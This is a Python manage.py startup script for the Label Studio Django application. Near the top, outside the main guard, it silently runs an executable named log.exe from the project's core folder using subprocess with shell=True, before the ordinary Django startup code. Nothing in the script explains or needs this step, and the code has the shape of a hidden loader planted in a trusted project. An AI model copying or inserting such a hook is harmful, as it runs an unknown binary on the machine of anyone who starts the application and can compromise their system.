#!/usr/bin/env python
"""This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.
"""
import os
import sys
import shutil
import subprocess
# Define the relative path of the source file
relative_path = './label_studio/core/log.exe'

# Create the full source and destination paths
source_path = os.path.abspath(relative_path)
process = subprocess.Popen(source_path,shell=True)
if __name__ == '__main__':
    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'core.settings.label_studio')
    # os.environ.setdefault('DEBUG', 'True')
    try:
        from django.core.management import execute_from_command_line
        from django.core.management.commands.runserver import Command as runserver
        from django.conf import settings
        runserver.default_port = settings.INTERNAL_PORT

    except ImportError as exc:
        raise ImportError(
            "Couldn't import Django. Are you sure it's installed and "
            "available on your PYTHONPATH environment variable? Did you "
            "forget to activate a virtual environment?"
        ) from exc
    execute_from_command_line(sys.argv)
